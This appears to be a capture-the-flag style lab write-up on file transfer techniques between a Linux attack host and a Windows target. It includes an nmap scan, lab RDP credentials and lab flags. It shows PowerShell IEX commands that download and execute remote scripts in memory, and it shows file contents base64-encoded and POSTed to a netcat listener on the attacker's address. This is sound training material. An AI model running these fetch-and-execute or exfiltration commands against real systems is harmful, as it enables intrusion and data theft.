# File Transfers - Writeup
## First Question
Download the file flag.yxy from the web root using wget from the Pwnbox. Submit the contents of the file as your answer. 
### 1. Scanning ports
```bash
sudo nmap -sV -sC 10.129.201.55 --min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-27 17:26 -04
Nmap scan report for 10.129.201.55
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.2.33)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.2.33
|_http-title: Access forbidden!
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.2.33)
|_http-title: Access forbidden!
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.2.33
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp open  mysql?
| fingerprint-strings: 
|   JavaRMI, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, SIPOptions, TLSSessionReq, giop, ms-sql-s, oracle-tns: 
|_    Host '10.10.14.171' is not allowed to connect to this MariaDB server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-27T21:27:04+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=MS02
| Not valid before: 2026-06-26T21:25:16
|_Not valid after:  2026-12-26T21:25:16
| rdp-ntlm-info: 
|   Target_Name: MS02
|   NetBIOS_Domain_Name: MS02
|   NetBIOS_Computer_Name: MS02
|   DNS_Domain_Name: MS02
|   DNS_Computer_Name: MS02
|   Product_Version: 10.0.14393
|_  System_Time: 2026-06-27T21:26:56+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=6/27%Time=6A404012%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSS
SF:essionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerb
SF:eros,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4B,"G\0\0\x01\
SF:xffj\x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4B,"G\0\0\x01\xffj\
SF:x04Host\x20'10\.10\.14\.171'\x20is\x20not\x20allowed\x20to\x20connect\x
SF:20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4B,"G\0\0\x01\xffj\x04Hos
SF:t\x20'10\.10\.14\.171'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x
SF:20this\x20MariaDB\x20server")%r(oracle-tns,4B,"G\0\0\x01\xffj\x04Host\x
SF:20'10\.10\.14\.171'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t
SF:his\x20MariaDB\x20server")%r(ms-sql-s,4B,"G\0\0\x01\xffj\x04Host\x20'10
SF:\.10\.14\.171'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server")%r(giop,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\
SF:.171'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB
SF:\x20server");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-27T21:26:56
|_  start_date: 2026-06-27T21:25:15
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.96 seconds
```
### 2. Download the file
```bash
wget "http://10.129.201.55/flag.txt"

cat flag.txt
b1a4ca918282fcd96004565521944a3b
```

## Second question
Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.

> RDP to 10.129.201.55 (ACADEMY-MISC-MS02), with user "htb-student" and password "HTB_@cademy_stdnt!"

```bash
xfreerdp /v:10.129.201.55 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.171:8000/upload -File C:\Users\htb-student\upload_win.zip

cd impacket
source venv/bin/activate
cd examples
sudo ../venv/bin/python3 smbserver.py share -smb2support /tmp/smbshare -user test -password test

mkdir -p /tmp/smbshare
cp ~/Desktop/upload_win.zip /tmp/smbshare/

net use n: /delete
net use n: \\10.10.14.171\share /user:test test
copy n:\upload_win.zip C:\Users\htb-student\Desktop\

# Unzip file
# cmd on directory
hahser upload_win.txt
f458303ea783c224c6b4e7ef7f17eb9d
```

Connect to the target machine via RDP and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished.

```bash
# Create test files for each method
echo "transferred via SMB linux to windows" > /tmp/smb_linux_to_windows.txt
echo "transferred via FTP linux to windows" > /tmp/ftp_linux_to_windows.txt
echo "transferred via HTTP linux to windows" > /tmp/http_linux_to_windows.txt
echo "transferred via base64" > /tmp/base64_linux_to_windows.txt
```

## Method 1 - SMB
### Linux -> Windows (download from share)
#### Ubuntu
```bash
mkdir -p /tmp/smbshare
cp /tmp/smb_linux_to_windows.txt /tmp/smbshare/
sudo ../venv/bin/python3 ~/impacket/examples/smbserver.py share -smb2support /tmp/smbshare -user test -password test
```

#### Windows
```bash
net use n: \\10.10.14.171\share /user:test test
copy n:\smb_linux_to_windows.txt C:\Users\htb-student\Desktop\
```

### Windows -> Linux (upload to share)
#### Windows
```
echo "transferred via SMB windows to linux" > C:\Users\htb-student\Desktop\smb_windows_to_linux.txt
copy C:\Users\htb-student\Desktop\smb_windows_to_linux.txt n:\
```

#### Ubuntu (verify)
```bash
cat /tmp/smbshare/smb_windows_to_linux.txt
```

## Method 2 - FTP
### Linux -> Windows (download from FTP)
#### Ubuntu
```bash
echo "transferred via FTP linux to windows" > /tmp/ftp_linux_to_windows.txt
sudo venv/bin/python3 -m pyftpdlib --port 21 --write
```

#### Windows
```bash
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.171/ftp_windows_to_linux.txt', 'C:\Users\htb-student\Desktop\smb_windows_to_linux.txt')
```

#### Ubuntu (verify)
```bash
cat ~/ftp_windows_to_linux.txt
```

## Method 3 - HTTP (PowerShell Web Download)
### Linux -> Windows (download via HTTP)
#### Ubuntu
```bash
echo "transferred via HTTP linux to windows" > /tmp/http_linux_to_windows.txt
cd /tmp && python3 -m http.server 8080
```

#### Windows
```bash
# Write to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.171:8080/http_linux_to_windows.txt', 'C:\Users\htb-student\Desktop\http_linux_to_windows.txt')

# Fileless (runs in memory)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.171:8080/http_linux_to_windows.txt')
```

### Windows -> Linux (upload via HTTP POST)
#### Ubuntu
```bash
nc -lvnp 8000
```

#### Windows
```bash
# PowerShell
echo "transferred via HTTP windows to linux" > C:\Users\htb-student\Desktop\smb_windows_to_linux.txt

$content = Get-Content 'C:\Users\htb-student\Desktop\smb_windows_to_linux.txt'
$b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
Invoke-WebRequest -Uri http://10.10.14.171:8000/ -Method POST -Body $b64
```

#### Ubuntu
```bash
echo "<BASE64_OUTPUT>" | base64 -d -w 0 > ~/http_windows_to_linux.txt
cat ~/http_windows_to_linux.txt
```

## Method 4 - Base64 (no network channel needed)
### Linux -> Windows
#### Ubuntu
```bash
cat base64_linux_to_windows.txt | base64 -w 0; echo
# Copy the output
# YmFzZTY0X2xpbnV4X3RvX3dpbmRvd3MK
```

#### Windows
```bash
[IO.File]::WriteAllBytes("C:\Users\htb-student\Desktop\base64_linux_to_windows.txt", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))
# Verify
Get-FileHash C:\Users\htb-student\Desktop\base64_linux_to_windows.txt -Algorithm MD5
```

### Windows -> Linux
#### Windows
```bash
[Convert]::ToBase64String((Get-Content -Path 'C:\Users\htb-student\Desktop\base64_windows_to_linux.txt' -Encoding Byte))
# Copy the output
# YmFzZTY0X3dpbmRvd3NfdG9fbGludXg=
```

#### Ubuntu
```bash
echo "<PASTE_BASE64_HERE>" | base64 -d > ~/base64_windows_to_linux.txt
cat ~/base64_windows_to_linux.txt
```